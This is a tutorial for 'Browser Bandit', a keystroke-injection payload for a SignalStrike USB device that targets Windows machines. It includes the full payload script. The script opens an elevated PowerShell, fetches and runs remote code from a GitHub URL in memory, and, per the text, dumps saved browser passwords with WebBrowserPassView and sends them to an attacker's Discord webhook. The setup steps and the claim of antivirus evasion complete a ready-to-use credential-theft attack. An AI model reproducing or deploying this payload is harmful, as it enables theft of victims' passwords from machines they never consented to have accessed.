# **Browser Bandit (SignalStrike)**


# Requirements:

    hardware: Code-382 SignalStrike (store)
    Attacker: Windows/Linux/MacOS/Android/iOs with Discord installed
    Target: Windows 7/10/11

Browser Bandit can be deployed alongside the Code-382 Signal Strike. This combination leverages a PowerShell payload that executes directly in the system’s memory, bypassing antivirus detection and eliminating the need to write files locally. The PowerShell script then downloads Nirsoft’s WebBrowserPassView application, runs it, and collects any discovered passwords. The resulting password data is saved in a .txt file, which is then transmitted to the attacker’s Discord Webhook.

# 1. Create a Discord Webhook

To set up a Discord webhook, follow these steps:

    Create a new Discord server (if you don’t have one already).
    Right-click on the server icon and select Server Settings.
    Navigate to Integrations > New Webhook.

    Copy the webhook link and save it somewhere safe for later use.

# 2. Download Payload.txt

Next, you need to download Payload.taxt. You can get it either from the Code-382 GitHub repository or by copying the code provided below.

In the Payload.txt file, locate line 12 and replace <DISCORD WEBHOOK HERE> with your actual Discord webhook URL (without the angle brackets <>).

Payload.txt

```DELAY 100
GUI d
GUI r
DELAY 500
STRING powershell
CONTROL SHIFT ENTER
DELAY 3000
ALT Y
ENTER

DELAY 3000
STRING $webhook = '<DISCORD WEBHOOK HERE>'
ENTER
SPACE
STRING Start-Process powershell -ArgumentList "-NoProfile -WindowStyle Hidden -Command `$webhook='$webhook'; iex (iwr 'https://raw.githubusercontent.com/Code-382/Payload-Depot/main/SignalStrike/Browser%20Bandit/BrowserBandit.txt').Content" -NoNewWindow
ENTER```

# 3. Upload Your Payload to SignalStrike

    Plug in your SignalStrike device.
    Connect to its WiFi network (Default SSID: SignalStrike, Password: SignalStrike).
    Open a web browser and go to 192.168.4.1 to access the control panel.
    Create a new payload and name it “Browser Bandit.”
    Paste your modified Payload.txt (with the webhook) into the text box provided.
    Save the payload and execute it.
